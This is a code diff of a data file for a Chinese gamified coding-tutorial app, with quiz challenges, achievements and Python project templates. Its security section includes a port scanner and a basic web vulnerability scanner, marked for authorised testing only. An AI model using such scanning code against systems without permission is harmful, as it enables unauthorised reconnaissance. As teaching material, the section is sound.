+        { id: 602, title: "文字颜色", description: "设置颜色", difficulty: 1, xp: 10, courseType: "css", question: "设置文字颜色的属性？", template: "p {\n    ___: red;\n}", answer: "color", hint: "颜色的英文", explanation: "📌 color设置文字颜色" },
+        { id: 603, title: "字体大小", description: "调整字号", difficulty: 1, xp: 10, courseType: "css", question: "设置字体大小的属性？", template: "h1 {\n    ___: 24px;\n}", answer: "font-size", hint: "字体-大小", explanation: "📌 font-size设置字体大小" },
+        { id: 604, title: "外边距", description: "元素间距", difficulty: 1, xp: 15, courseType: "css", question: "设置外边距的属性？", template: ".box {\n    ___: 10px;\n}", answer: "margin", hint: "外边距的英文", explanation: "📌 margin设置元素外边距" },
+        { id: 605, title: "内边距", description: "内部间距", difficulty: 1, xp: 15, courseType: "css", question: "设置内边距的属性？", template: ".box {\n    ___: 20px;\n}", answer: "padding", hint: "内边距的英文", explanation: "📌 padding设置元素内边距" },
+        { id: 606, title: "弹性布局", description: "Flexbox", difficulty: 2, xp: 20, courseType: "css", question: "启用弹性布局的display值？", template: ".container {\n    display: ___;\n}", answer: "flex", hint: "弹性的英文", explanation: "📌 display: flex启用Flexbox布局" },
+        { id: 607, title: "主轴对齐", description: "Flex对齐", difficulty: 2, xp: 20, courseType: "css", question: "主轴对齐用什么属性？", template: ".container {\n    display: flex;\n    ___: center;\n}", answer: "justify-content", hint: "证明-内容", explanation: "📌 justify-content控制主轴对齐" },
+        { id: 608, title: "网格布局", description: "Grid布局", difficulty: 2, xp: 25, courseType: "css", question: "启用网格布局的display值？", template: ".container {\n    display: ___;\n}", answer: "grid", hint: "网格的英文", explanation: "📌 display: grid启用Grid布局" },
+        // ========== JavaScript挑战 ==========
+        { id: 701, title: "变量声明", description: "let关键字", difficulty: 1, xp: 10, courseType: "javascript", question: "ES6声明变量用什么关键字？", template: "___ name = '张三';", answer: "let", hint: "让的英文", explanation: "📌 let是ES6新增的变量声明" },
+        { id: 702, title: "常量声明", description: "const关键字", difficulty: 1, xp: 10, courseType: "javascript", question: "声明常量用什么关键字？", template: "___ PI = 3.14;", answer: "const", hint: "constant的缩写", explanation: "📌 const声明的变量不可重新赋值" },
+        { id: 703, title: "控制台输出", description: "调试输出", difficulty: 1, xp: 10, courseType: "javascript", question: "JS控制台输出方法？", template: "___.log('Hello JS!');", answer: "console", hint: "控制台的英文", explanation: "📌 console.log是最常用的调试方法" },
+        { id: 704, title: "箭头函数", description: "ES6函数", difficulty: 2, xp: 20, courseType: "javascript", question: "箭头函数用什么符号？", template: "const add = (a, b) ___ a + b;", answer: "=>", hint: "等号大于号", explanation: "📌 =>是箭头函数的标志" },
+        { id: 705, title: "获取元素", description: "DOM操作", difficulty: 1, xp: 15, courseType: "javascript", question: "通过ID获取元素的方法？", template: "let el = document.___(\"myId\");", answer: "getElementById", hint: "get Element By Id", explanation: "📌 getElementById通过ID获取元素" },
+        { id: 706, title: "添加事件", description: "事件监听", difficulty: 2, xp: 20, courseType: "javascript", question: "添加事件监听的方法？", template: "btn.___(\"click\", handler);", answer: "addEventListener", hint: "添加事件监听器", explanation: "📌 addEventListener添加事件监听" },
+        { id: 707, title: "模板字符串", description: "字符串插值", difficulty: 1, xp: 15, courseType: "javascript", question: "模板字符串用什么符号包裹？", template: "const msg = ___Hello ${name}___;", answer: "`", hint: "反引号", explanation: "📌 反引号`用于模板字符串" },
+        { id: 708, title: "异步等待", description: "async/await", difficulty: 3, xp: 30, courseType: "javascript", question: "等待Promise结果用什么关键字？", template: "async function getData() {\n    const result = ___ fetch(url);\n}", answer: "await", hint: "等待的英文", explanation: "📌 await等待Promise完成" },
+        // ========== AI人工智能挑战 ==========
+        { id: 801, title: "AI类型", description: "了解AI分类", difficulty: 1, xp: 10, courseType: "ai", question: "从数据中学习规律的AI技术叫什么？", template: "# ___学习是AI的核心技术", answer: "机器", hint: "Machine的中文", explanation: "📌 机器学习(Machine Learning)让计算机从数据中学习" },
+        { id: 802, title: "深度学习", description: "神经网络", difficulty: 1, xp: 10, courseType: "ai", question: "使用多层神经网络的学习方法叫？", template: "# ___学习使用多层神经网络", answer: "深度", hint: "Deep的中文", explanation: "📌 深度学习(Deep Learning)是机器学习的子集" },
+        { id: 803, title: "监督学习", description: "有标签数据", difficulty: 1, xp: 15, courseType: "ai", question: "使用带标签数据训练的学习方式？", template: "# ___学习需要标注好的训练数据", answer: "监督", hint: "Supervised", explanation: "📌 监督学习使用带标签的数据进行训练" },
+        { id: 804, title: "激活函数", description: "神经网络组件", difficulty: 2, xp: 20, courseType: "ai", question: "最常用的激活函数，输出max(0,x)？", template: "def ___(x):\n    return max(0, x)", answer: "relu", hint: "Rectified Linear Unit", explanation: "📌 ReLU是最常用的激活函数" },
+        { id: 805, title: "反向传播", description: "训练算法", difficulty: 2, xp: 25, courseType: "ai", question: "神经网络训练时传递梯度的算法？", template: "# ___传播算法用于更新权重", answer: "反向", hint: "Backward", explanation: "📌 反向传播(Backpropagation)计算梯度并更新权重" },
+        { id: 806, title: "损失函数", description: "评估误差", difficulty: 2, xp: 20, courseType: "ai", question: "衡量预测与实际差距的函数叫？", template: "# ___函数越小，模型越好\nloss = loss_fn(pred, label)", answer: "损失", hint: "Loss", explanation: "📌 损失函数(Loss Function)衡量模型预测的误差" },
+        { id: 807, title: "Prompt基础", description: "AI提示词", difficulty: 1, xp: 15, courseType: "ai", question: "给AI模型的输入指令叫什么？", template: "# 好的___能让AI给出更好的回答", answer: "Prompt", hint: "提示的英文", explanation: "📌 Prompt是与AI交互的关键，好的Prompt能获得更好的结果" },
+        { id: 808, title: "大语言模型", description: "LLM", difficulty: 2, xp: 20, courseType: "ai", question: "GPT、Claude这类AI属于什么模型？", template: "# ChatGPT是___语言模型", answer: "大", hint: "Large", explanation: "📌 大语言模型(LLM)能理解和生成自然语言" },
+        // ========== 更多C语言挑战 ==========
+        { id: 309, title: "条件语句", description: "if语句", difficulty: 1, xp: 10, courseType: "c", question: "条件判断用什么语句？", template: "___ (age >= 18) {\n    printf(\"成年\");\n}", answer: "if", hint: "如果的英文", explanation: "📌 if语句用于条件判断" },
+        { id: 310, title: "循环语句", description: "for循环", difficulty: 1, xp: 15, courseType: "c", question: "计数循环用什么语句？", template: "___ (int i = 0; i < 10; i++) {\n    printf(\"%d\", i);\n}", answer: "for", hint: "三部分循环", explanation: "📌 for循环适合已知次数的循环" },
+        { id: 311, title: "数组声明", description: "静态数组", difficulty: 1, xp: 15, courseType: "c", question: "声明整数数组的语法？", template: "int ___[10];", answer: "arr", hint: "array的缩写", explanation: "📌 C语言数组在声明时必须指定大小" },
+        { id: 312, title: "字符串复制", description: "strcpy函数", difficulty: 2, xp: 20, courseType: "c", question: "复制字符串的函数？", template: "char dest[50];\n___(dest, \"Hello\");", answer: "strcpy", hint: "string copy", explanation: "📌 strcpy将源字符串复制到目标" },
+        // ========== 更多C++挑战 ==========
+        { id: 409, title: "构造函数", description: "初始化对象", difficulty: 2, xp: 20, courseType: "cpp", question: "与类同名的初始化函数叫？", template: "class Person {\npublic:\n    ___(string n) { name = n; }\n};", answer: "Person", hint: "和类名一样", explanation: "📌 构造函数与类同名，用于初始化" },
+        { id: 410, title: "虚函数", description: "多态", difficulty: 3, xp: 30, courseType: "cpp", question: "实现多态的函数关键字？", template: "class Animal {\npublic:\n    ___ void speak() {}\n};", answer: "virtual", hint: "虚拟的英文", explanation: "📌 virtual使函数可被子类重写" },
+        { id: 411, title: "智能指针", description: "自动释放", difficulty: 3, xp: 30, courseType: "cpp", question: "独占所有权的智能指针？", template: "#include <memory>\n___<int> ptr(new int(10));", answer: "unique_ptr", hint: "唯一指针", explanation: "📌 unique_ptr独占资源所有权" },
+        { id: 412, title: "Lambda表达式", description: "匿名函数", difficulty: 3, xp: 30, courseType: "cpp", question: "Lambda表达式以什么开始？", template: "auto add = ___(int a, int b) { return a + b; };", answer: "[]", hint: "方括号", explanation: "📌 []是Lambda表达式的捕获列表" },
+        // ========== 更多Java挑战 ==========
+        { id: 509, title: "抽象类", description: "抽象方法", difficulty: 2, xp: 25, courseType: "java", question: "定义抽象类用什么关键字？", template: "___ class Shape {\n    abstract void draw();\n}", answer: "abstract", hint: "抽象的英文", explanation: "📌 abstract类不能实例化" },
+        { id: 510, title: "final关键字", description: "不可变", difficulty: 2, xp: 20, courseType: "java", question: "声明不可继承的类？", template: "___ class Constants {}", answer: "final", hint: "最终的英文", explanation: "📌 final类不能被继承" },
+        { id: 511, title: "静态方法", description: "类方法", difficulty: 2, xp: 20, courseType: "java", question: "类方法用什么修饰？", template: "public ___ int add(int a, int b) {\n    return a + b;\n}", answer: "static", hint: "静态的英文", explanation: "📌 static方法属于类而非实例" },
+        { id: 512, title: "泛型", description: "类型参数", difficulty: 3, xp: 30, courseType: "java", question: "泛型类型参数用什么表示？", template: "List<___> list = new ArrayList<>();", answer: "T", hint: "Type的首字母", explanation: "📌 T是常用的泛型类型参数" },
+        // ========== 更多CSS挑战 ==========
+        { id: 609, title: "边框圆角", description: "圆角效果", difficulty: 1, xp: 15, courseType: "css", question: "设置圆角的属性？", template: ".card {\n    ___: 10px;\n}", answer: "border-radius", hint: "边框-半径", explanation: "📌 border-radius设置圆角" },
+        { id: 610, title: "阴影", description: "盒子阴影", difficulty: 2, xp: 20, courseType: "css", question: "添加阴影的属性？", template: ".card {\n    ___: 0 4px 6px rgba(0,0,0,0.1);\n}", answer: "box-shadow", hint: "盒子-阴影", explanation: "📌 box-shadow添加元素阴影" },
+        { id: 611, title: "过渡动画", description: "平滑变化", difficulty: 2, xp: 20, courseType: "css", question: "添加过渡效果的属性？", template: ".btn {\n    ___: all 0.3s ease;\n}", answer: "transition", hint: "过渡的英文", explanation: "📌 transition使属性变化更平滑" },
+        { id: 612, title: "变换", description: "旋转缩放", difficulty: 2, xp: 25, courseType: "css", question: "旋转/缩放元素的属性？", template: ".icon:hover {\n    ___: rotate(45deg);\n}", answer: "transform", hint: "变换的英文", explanation: "📌 transform可旋转、缩放、移动元素" },
+        // ========== 更多JavaScript挑战 ==========
+        { id: 709, title: "数组遍历", description: "forEach方法", difficulty: 1, xp: 15, courseType: "javascript", question: "遍历数组的方法？", template: "arr.___(item => console.log(item));", answer: "forEach", hint: "对每个", explanation: "📌 forEach遍历数组每个元素" },
+        { id: 710, title: "数组映射", description: "map方法", difficulty: 2, xp: 20, courseType: "javascript", question: "转换数组元素的方法？", template: "const doubled = arr.___(x => x * 2);", answer: "map", hint: "映射的英文", explanation: "📌 map返回新数组" },
+        { id: 711, title: "数组过滤", description: "filter方法", difficulty: 2, xp: 20, courseType: "javascript", question: "筛选数组元素的方法？", template: "const evens = arr.___(x => x % 2 === 0);", answer: "filter", hint: "过滤的英文", explanation: "📌 filter返回符合条件的元素" },
+        { id: 712, title: "解构赋值", description: "对象解构", difficulty: 2, xp: 25, courseType: "javascript", question: "对象解构用什么括号？", template: "const ___ name, age } = person;", answer: "{", hint: "花括号", explanation: "📌 {}用于对象解构" },
+        // ========== 更多AI挑战 ==========
+        { id: 809, title: "卷积神经网络", description: "图像处理", difficulty: 2, xp: 25, courseType: "ai", question: "处理图像的神经网络简称？", template: "# ___常用于图像识别", answer: "CNN", hint: "Convolutional Neural Network", explanation: "📌 CNN卷积神经网络擅长图像处理" },
+        { id: 810, title: "循环神经网络", description: "序列处理", difficulty: 2, xp: 25, courseType: "ai", question: "处理序列数据的神经网络简称？", template: "# ___常用于文本和语音", answer: "RNN", hint: "Recurrent Neural Network", explanation: "📌 RNN循环神经网络处理序列数据" },
+        { id: 811, title: "自然语言处理", description: "文本AI", difficulty: 2, xp: 20, courseType: "ai", question: "让AI理解语言的技术简称？", template: "# ChatGPT使用___技术", answer: "NLP", hint: "Natural Language Processing", explanation: "📌 NLP自然语言处理让AI理解人类语言" },
+        { id: 812, title: "过拟合", description: "训练问题", difficulty: 2, xp: 25, courseType: "ai", question: "模型在训练集上表现好但测试差？", template: "# ___是机器学习常见问题", answer: "过拟合", hint: "Overfitting", explanation: "📌 过拟合指模型记住训练数据而非学习规律" }
+    ],
+
+    // 成就系统
+    achievements: [
+        { id: 'first_card', name: '知识启蒙', icon: '📖', desc: '翻阅第一张知识卡片', condition: cards => cards >= 1 },
+        { id: 'card_5', name: '求知若渴', icon: '📚', desc: '翻阅5张知识卡片', condition: cards => cards >= 5 },
+        { id: 'card_10', name: '学富五车', icon: '🎓', desc: '翻阅10张知识卡片', condition: cards => cards >= 10 },
+        { id: 'first_challenge', name: '初露锋芒', icon: '⚔️', desc: '完成第一个挑战', condition: (_, challenges) => challenges >= 1 },
+        { id: 'challenge_5', name: '编程新星', icon: '⭐', desc: '完成5个挑战', condition: (_, challenges) => challenges >= 5 },
+        { id: 'challenge_10', name: '代码高手', icon: '💻', desc: '完成10个挑战', condition: (_, challenges) => challenges >= 10 },
+        { id: 'challenge_25', name: '算法达人', icon: '🧠', desc: '完成25个挑战', condition: (_, challenges) => challenges >= 25 },
+        { id: 'challenge_50', name: '编程大师', icon: '🏆', desc: '完成50个挑战', condition: (_, challenges) => challenges >= 50 },
+        { id: 'challenge_75', name: '代码专家', icon: '🎖️', desc: '完成75个挑战', condition: (_, challenges) => challenges >= 75 },
+        { id: 'challenge_100', name: '百题达人', icon: '💯', desc: '完成100个挑战', condition: (_, challenges) => challenges >= 100 },
+        { id: 'challenge_140', name: '传奇大师', icon: '👑', desc: '完成全部140个挑战', condition: (_, challenges) => challenges >= 140 },
+        { id: 'xp_100', name: '百分努力', icon: '💯', desc: '累计获得100经验值', condition: (_, __, xp) => xp >= 100 },
+        { id: 'xp_300', name: '修炼有成', icon: '🔥', desc: '累计获得300经验值', condition: (_, __, xp) => xp >= 300 },
+        { id: 'xp_500', name: '实力非凡', icon: '⚡', desc: '累计获得500经验值', condition: (_, __, xp) => xp >= 500 },
+        { id: 'xp_1000', name: '传奇程序员', icon: '👑', desc: '累计获得1000经验值', condition: (_, __, xp) => xp >= 1000 },
+        { id: 'streak_3', name: '小有成就', icon: '🎯', desc: '连续答对3题', condition: (_, __, ___, streak) => streak >= 3 },
+        { id: 'streak_5', name: '势如破竹', icon: '🚀', desc: '连续答对5题', condition: (_, __, ___, streak) => streak >= 5 },
+        { id: 'streak_10', name: '无人能挡', icon: '💎', desc: '连续答对10题', condition: (_, __, ___, streak) => streak >= 10 }
+    ],
+
+    // ===== 项目实战 =====
+    projects: [
+        {
+            id: 1,
+            title: "🔢 简易计算器",
+            description: "制作一个支持加减乘除的命令行计算器",
+            difficulty: 1,
+            xp: 50,
+            skills: ["输入输出", "条件判断", "类型转换"],
+            instructions: `## 项目目标
 制作一个简单的计算器，支持两个数的加减乘除运算。
 
 ## 功能要求
@@ -2363,7 +2363,7 @@
 - 使用 input() 获取用户输入
 - 使用 float() 转换数字
 - 使用 if-elif-else 判断运算符`,
-                    template: `# 简易计算器
+            template: `# 简易计算器
 # 请完成下面的代码
 
 # 1. 获取用户输入
@@ -2389,7 +2389,7 @@ else:
 
 # 3. 输出结果
 print(f"结果: {result}")`,
-                    solution: `# 完整解答
+            solution: `# 完整解答
 num1 = float(input("请输入第一个数字: "))
 operator = input("请输入运算符 (+, -, *, /): ")
 num2 = float(input("请输入第二个数字: "))
@@ -2409,15 +2409,15 @@ else:
     result = "错误：无效的运算符"
 
 print(f"结果: {result}")`
-                },
-                {
-                    id: 2,
-                    title: "🎲 猜数字游戏",
-                    description: "电脑随机生成数字，玩家来猜",
-                    difficulty: 1,
-                    xp: 60,
-                    skills: ["随机数", "循环", "条件判断"],
-                    instructions: `## 项目目标
+        },
+        {
+            id: 2,
+            title: "🎲 猜数字游戏",
+            description: "电脑随机生成数字，玩家来猜",
+            difficulty: 1,
+            xp: 60,
+            skills: ["随机数", "循环", "条件判断"],
+            instructions: `## 项目目标
 制作一个猜数字游戏，电脑生成1-100的随机数，玩家猜测。
 
 ## 功能要求
@@ -2431,7 +2431,7 @@ print(f"结果: {result}")`
 - import random
 - random.randint(1, 100)
 - 使用 while 循环`,
-                    template: `# 猜数字游戏
+            template: `# 猜数字游戏
 import random
 
 # 生成随机数
@@ -2458,7 +2458,7 @@ while attempts < max_attempts:
     print(f"剩余机会: {max_attempts - attempts}")
 else:
     print(f"游戏结束！答案是 {secret}")`,
-                    solution: `import random
+            solution: `import random
 
 secret = random.randint(1, 100)
 attempts = 0
@@ -2479,15 +2479,15 @@ while attempts < max_attempts:
         print("太大了！")
 else:
     print(f"答案是 {secret}")`
-                },
-                {
-                    id: 3,
-                    title: "🔐 密码生成器",
-                    description: "生成随机强密码",
-                    difficulty: 1,
-                    xp: 50,
-                    skills: ["随机数", "字符串", "列表"],
-                    instructions: `## 项目目标
+        },
+        {
+            id: 3,
+            title: "🔐 密码生成器",
+            description: "生成随机强密码",
+            difficulty: 1,
+            xp: 50,
+            skills: ["随机数", "字符串", "列表"],
+            instructions: `## 项目目标
 制作一个密码生成器，可以生成指定长度的随机密码。
 
 ## 功能要求
@@ -2502,7 +2502,7 @@ else:
 - string.ascii_letters 包含所有字母
 - string.digits 包含数字
 - random.choice() 随机选择`,
-                    template: `# 密码生成器
+            template: `# 密码生成器
 import random
 import string
 
@@ -2526,7 +2526,7 @@ include_special = input("是否包含特殊字符？(y/n): ").lower() == 'y'
 
 password = generate_password(length, include_special)
 print(f"生成的密码: {password}")`,
-                    solution: `import random
+            solution: `import random
 import string
 
 def generate_password(length, include_special=True):
@@ -2538,15 +2538,15 @@ def generate_password(length, include_special=True):
 length = int(input("密码长度: "))
 include_special = input("包含特殊字符？(y/n): ").lower() == 'y'
 print(f"密码: {generate_password(length, include_special)}")`
-                },
-                {
-                    id: 4,
-                    title: "📝 待办事项列表",
-                    description: "命令行版本的Todo List",
-                    difficulty: 2,
-                    xp: 80,
-                    skills: ["列表操作", "循环", "函数"],
-                    instructions: `## 项目目标
+        },
+        {
+            id: 4,
+            title: "📝 待办事项列表",
+            description: "命令行版本的Todo List",
+            difficulty: 2,
+            xp: 80,
+            skills: ["列表操作", "循环", "函数"],
+            instructions: `## 项目目标
 制作一个命令行待办事项管理程序。
 
 ## 功能要求
@@ -2560,7 +2560,7 @@ print(f"密码: {generate_password(length, include_special)}")`
 - 使用列表存储待办事项
 - 使用字典存储事项状态
 - while True 循环处理用户输入`,
-                    template: `# 待办事项列表
+            template: `# 待办事项列表
 todos = []
 
 def show_menu():
@@ -2617,7 +2617,7 @@ while True:
     elif choice == "5":
         print("再见！")
         break`,
-                    solution: `# 完整版待办事项（含文件保存）
+            solution: `# 完整版待办事项（含文件保存）
 import json
 
 def load_todos():
@@ -2633,15 +2633,15 @@ def save_todos(todos):
 
 todos = load_todos()
 # ... 其他代码同上`
-                },
-                {
-                    id: 5,
-                    title: "📊 成绩统计器",
-                    description: "统计学生成绩并生成报告",
-                    difficulty: 2,
-                    xp: 70,
-                    skills: ["字典", "列表", "统计计算"],
-                    instructions: `## 项目目标
+        },
+        {
+            id: 5,
+            title: "📊 成绩统计器",
+            description: "统计学生成绩并生成报告",
+            difficulty: 2,
+            xp: 70,
+            skills: ["字典", "列表", "统计计算"],
+            instructions: `## 项目目标
 制作一个成绩统计程序，支持录入和分析成绩。
 
 ## 功能要求
@@ -2655,7 +2655,7 @@ todos = load_todos()
 - sum() 求和，len() 计数
 - max(), min() 求极值
 - sorted() 排序`,
-                    template: `# 成绩统计器
+            template: `# 成绩统计器
 students = {}
 
 def add_student():
@@ -2715,16 +2715,16 @@ while True:
     elif choice == "3": show_ranking()
     elif choice == "4": grade_distribution()
     elif choice == "5": break`,
-                    solution: `# 同上模板，已经是完整代码`
-                },
-                {
-                    id: 6,
-                    title: "🎮 石头剪刀布",
-                    description: "与电脑对战的猜拳游戏",
-                    difficulty: 1,
-                    xp: 50,
-                    skills: ["随机数", "条件判断", "循环"],
-                    instructions: `## 项目目标
+            solution: `# 同上模板，已经是完整代码`
+        },
+        {
+            id: 6,
+            title: "🎮 石头剪刀布",
+            description: "与电脑对战的猜拳游戏",
+            difficulty: 1,
+            xp: 50,
+            skills: ["随机数", "条件判断", "循环"],
+            instructions: `## 项目目标
 制作一个石头剪刀布游戏，可以与电脑对战。
 
 ## 功能要求
@@ -2737,7 +2737,7 @@ while True:
 ## 提示
 - 石头>剪刀>布>石头
 - 使用 random.choice()`,
-                    template: `# 石头剪刀布
+            template: `# 石头剪刀布
 import random
 
 choices = ["石头", "剪刀", "布"]
@@ -2779,16 +2779,16 @@ while True:
     print(f"比分 - 你:{player_score} 电脑:{computer_score}")
 
 print(f"\\n最终比分 - 你:{player_score} 电脑:{computer_score}")`,
-                    solution: `# 同上，已是完整代码`
-                },
-                {
-                    id: 7,
-                    title: "📚 单词记忆卡",
-                    description: "英语单词学习和测试程序",
-                    difficulty: 2,
-                    xp: 80,
-                    skills: ["字典", "随机", "文件操作"],
-                    instructions: `## 项目目标
+            solution: `# 同上，已是完整代码`
+        },
+        {
+            id: 7,
+            title: "📚 单词记忆卡",
+            description: "英语单词学习和测试程序",
+            difficulty: 2,
+            xp: 80,
+            skills: ["字典", "随机", "文件操作"],
+            instructions: `## 项目目标
 制作一个单词记忆程序，帮助学习英语单词。
 
 ## 功能要求
@@ -2801,7 +2801,7 @@ print(f"\\n最终比分 - 你:{player_score} 电脑:{computer_score}")`,
 ## 提示
 - 用字典存储 {英文: 中文}
 - random.choice() 随机抽取`,
-                    template: `# 单词记忆卡
+            template: `# 单词记忆卡
 import random
 
 # 单词库
@@ -2854,16 +2854,16 @@ while True:
     elif choice == "2": add_word()
     elif choice == "3": show_stats()
     elif choice == "4": break`,
-                    solution: `# 同上，已是完整代码`
-                },
-                {
-                    id: 8,
-                    title: "⏱️ 倒计时器",
-                    description: "制作一个倒计时程序",
-                    difficulty: 2,
-                    xp: 60,
-                    skills: ["时间模块", "循环", "格式化"],
-                    instructions: `## 项目目标
+            solution: `# 同上，已是完整代码`
+        },
+        {
+            id: 8,
+            title: "⏱️ 倒计时器",
+            description: "制作一个倒计时程序",
+            difficulty: 2,
+            xp: 60,
+            skills: ["时间模块", "循环", "格式化"],
+            instructions: `## 项目目标
 制作一个倒计时器，支持设置时间并显示剩余时间。
 
 ## 功能要求
@@ -2876,7 +2876,7 @@ while True:
 - import time
 - time.sleep(1) 暂停1秒
 - 使用 \\r 回车覆盖显示`,
-                    template: `# 倒计时器
+            template: `# 倒计时器
 import time
 
 def countdown(seconds):
@@ -2897,16 +2897,16 @@ try:
     countdown(total)
 except KeyboardInterrupt:
     print("\\n倒计时已取消")`,
-                    solution: `# 同上，已是完整代码`
-                },
-                {
-                    id: 9,
-                    title: "📈 数据可视化",
-                    description: "用字符画绘制柱状图",
-                    difficulty: 2,
-                    xp: 70,
-                    skills: ["字符串操作", "列表", "格式化输出"],
-                    instructions: `## 项目目标
+            solution: `# 同上，已是完整代码`
+        },
+        {
+            id: 9,
+            title: "📈 数据可视化",
+            description: "用字符画绘制柱状图",
+            difficulty: 2,
+            xp: 70,
+            skills: ["字符串操作", "列表", "格式化输出"],
+            instructions: `## 项目目标
 制作一个文字版柱状图生成器。
 
 ## 功能要求
@@ -2918,7 +2918,7 @@ except KeyboardInterrupt:
 ## 提示
 - 找出最大值进行缩放
 - 使用字符串乘法: "█" * n`,
-                    template: `# 文字柱状图
+            template: `# 文字柱状图
 def draw_bar_chart(data):
     max_val = max(data.values())
     max_bar_length = 40  # 最大柱子长度
@@ -2958,16 +2958,16 @@ while True:
 
 if custom_data:
     draw_bar_chart(custom_data)`,
-                    solution: `# 同上，已是完整代码`
-                },
-                {
-                    id: 10,
-                    title: "🔍 文本分析器",
-                    description: "分析文本的字数、词频等",
-                    difficulty: 3,
-                    xp: 100,
-                    skills: ["字符串", "字典", "排序"],
-                    instructions: `## 项目目标
+            solution: `# 同上，已是完整代码`
+        },
+        {
+            id: 10,
+            title: "🔍 文本分析器",
+            description: "分析文本的字数、词频等",
+            difficulty: 3,
+            xp: 100,
+            skills: ["字符串", "字典", "排序"],
+            instructions: `## 项目目标
 制作一个文本分析工具，统计文本的各种信息。
 
 ## 功能要求
@@ -2980,7 +2980,7 @@ if custom_data:
 - split() 分割单词
 - collections.Counter 统计频率
 - lower() 统一小写`,
-                    template: `# 文本分析器
+            template: `# 文本分析器
 from collections import Counter
 
 def analyze_text(text):
@@ -3034,18 +3034,18 @@ while True:
 
 if lines:
     analyze_text("\\n".join(lines))`,
-                    solution: `# 同上，已是完整代码`
-                },
-                // ========== 网络安全项目 ==========
-                {
-                    id: 101,
-                    title: "🔍 端口扫描器",
-                    description: "制作一个简单的端口扫描工具",
-                    difficulty: 2,
-                    xp: 80,
-                    courseType: "security",
-                    skills: ["Socket编程", "多线程", "网络基础"],
-                    instructions: `## 项目目标
+            solution: `# 同上，已是完整代码`
+        },
+        // ========== 网络安全项目 ==========
+        {
+            id: 101,
+            title: "🔍 端口扫描器",
+            description: "制作一个简单的端口扫描工具",
+            difficulty: 2,
+            xp: 80,
+            courseType: "security",
+            skills: ["Socket编程", "多线程", "网络基础"],
+            instructions: `## 项目目标
 制作一个端口扫描器，检测目标主机开放的端口。
 
 ## 功能要求
@@ -3060,7 +3060,7 @@ if lines:
 - 可用多线程加速
 
 ⚠️ 仅用于授权测试！`,
-                    template: `# 端口扫描器
+            template: `# 端口扫描器
 import socket
 
 def scan_port(ip, port):
@@ -3094,17 +3094,17 @@ def scan_ports(ip, start_port, end_port):
 
 # 测试 (扫描本地常见端口)
 scan_ports("127.0.0.1", 20, 100)`,
-                    solution: `# 完整版本已在模板中`
-                },
-                {
-                    id: 102,
-                    title: "🔐 密码强度检测器",
-                    description: "检测密码的安全强度",
-                    difficulty: 1,
-                    xp: 50,
-                    courseType: "security",
-                    skills: ["字符串处理", "正则表达式", "安全意识"],
-                    instructions: `## 项目目标
+            solution: `# 完整版本已在模板中`
+        },
+        {
+            id: 102,
+            title: "🔐 密码强度检测器",
+            description: "检测密码的安全强度",
+            difficulty: 1,
+            xp: 50,
+            courseType: "security",
+            skills: ["字符串处理", "正则表达式", "安全意识"],
+            instructions: `## 项目目标
 制作一个密码强度检测工具。
 
 ## 检测规则
@@ -3118,7 +3118,7 @@ scan_ports("127.0.0.1", 20, 100)`,
 - 弱: 满足1-2条
 - 中: 满足3-4条
 - 强: 满足全部5条`,
-                    template: `# 密码强度检测器
+            template: `# 密码强度检测器
 import re
 
 def check_password(password):
@@ -3174,17 +3174,17 @@ for pwd in passwords:
     print(f"强度: {strength} ({score}/5)")
     for f in feedback:
         print(f"  {f}")`,
-                    solution: `# 完整版本已在模板中`
-                },
-                {
-                    id: 103,
-                    title: "🕵️ 简易漏洞扫描器",
-                    description: "检测网站常见安全问题",
-                    difficulty: 3,
-                    xp: 100,
-                    courseType: "security",
-                    skills: ["HTTP请求", "安全检测", "报告生成"],
-                    instructions: `## 项目目标
+            solution: `# 完整版本已在模板中`
+        },
+        {
+            id: 103,
+            title: "🕵️ 简易漏洞扫描器",
+            description: "检测网站常见安全问题",
+            difficulty: 3,
+            xp: 100,
+            courseType: "security",
+            skills: ["HTTP请求", "安全检测", "报告生成"],
+            instructions: `## 项目目标
 制作一个简单的Web漏洞扫描器。
 
 ## 检测项目
@@ -3198,7 +3198,7 @@ for pwd in passwords:
 - robots.txt分析
 
 ⚠️ 仅用于授权测试！`,
-                    template: `# 简易漏洞扫描器
+            template: `# 简易漏洞扫描器
 import requests
 
 def scan_headers(url):
@@ -3254,212 +3254,212 @@ def check_sensitive_files(url):
 url = "https://example.com"
 scan_headers(url)
 check_sensitive_files(url)`,
-                    solution: `# 完整版本已在模板中`
-                }
-            ]
-        };
+            solution: `# 完整版本已在模板中`
+        }
+    ]
+};
 
-        // ============== 游戏状态 ==============
-        let gameState = {
-            currentPage: 'courseSelect',
-            selectedCourse: null, // 'python' 或 'security'
-            selectedCategory: null,
-            currentCardIndex: 0,
-            currentChallengeIndex: 0,
-            flippedCards: new Set(),
-            completedChallenges: new Set(),
-            totalXP: 0,
-            streak: 0,
-            maxStreak: 0,  // 最高连胜
-            unlockedAchievements: new Set(),
-            musicPlaying: false,
-            hintCount: 0,
-            // 筛选状态
-            filterDifficulty: 0,
-            filterStatus: 'all',
-            filterCategory: 'all',
-            currentProjectIndex: 0,
-            // 分页状态
-            challengePage: 0,
-            challengesPerPage: 12,
-            // 新增：错题本和统计
-            wrongAnswers: new Set(),  // 错题ID
-            totalAttempts: 0,  // 总答题次数
-            correctAttempts: 0,  // 正确次数
-            studyTime: 0,  // 学习时长(秒)
-            lastStudyDate: null,  // 上次学习日期
-            dailyGoal: 10,  // 每日目标题数
-            todayCompleted: 0  // 今日完成数
-        };
-        
-        // 学习时长计时器
-        let studyTimer = null;
-        function startStudyTimer() {
-            if (!studyTimer) {
-                studyTimer = setInterval(() => {
-                    gameState.studyTime++;
-                    // 每分钟保存一次
-                    if (gameState.studyTime % 60 === 0) saveProgress();
-                }, 1000);
-            }
-        }
-        startStudyTimer();
-        
-        // 题目分类映射
-        const CHALLENGE_CATEGORIES = {
-            '基础语法': [1, 2, 3, 4, 5, 6, 7, 8, 9, 10],
-            'GUI界面': [11, 39, 40, 41, 42],
-            '数据处理': [12, 43, 44, 45, 46],
-            '网络爬虫': [13, 14, 47, 48, 49, 50],
-            '正则表达式': [15, 101, 102, 103, 104, 105],
-            '字符串': [16, 17, 18, 19, 20, 56, 57, 58, 59, 60, 81, 82, 83, 84],
-            '列表': [21, 22, 23, 24, 25, 85, 86, 87, 88],
-            '字典': [26, 27, 28, 106, 107, 108, 109, 110],
-            '控制流': [29, 30, 31, 32, 89, 90, 91, 92],
-            '函数': [33, 34, 35, 111, 112, 113, 114, 115],
-            '文件操作': [36, 37, 38, 116, 117, 118, 119, 120],
-            '类型转换': [51, 52, 53, 54, 55],
-            '集合元组': [61, 62, 63, 64, 65],
